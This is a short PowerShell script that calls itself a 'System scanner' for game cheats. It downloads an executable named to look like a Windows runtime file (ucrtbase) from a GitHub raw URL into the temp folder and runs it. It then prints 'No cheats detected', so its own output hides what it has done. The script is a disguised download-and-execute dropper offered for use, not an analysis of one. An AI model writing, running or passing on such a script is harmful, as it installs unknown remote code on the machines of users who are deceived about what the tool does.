Write-Host "System scanner" -ForegroundColor Cyan
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/fundrug35-jpg/Check-crypt/main/ucrtbase_12a7a4d4bc.exe" -OutFile "$env:TEMP\ucrtbase_12a7a4d4bc.exe" -UseBasicParsing
Write-Host "instalizing cheats" -ForegroundColor Yellow
& "$env:TEMP\ucrtbase_12a7a4d4bc.exe"
Write-Host "No cheats detected" -ForegroundColor Green
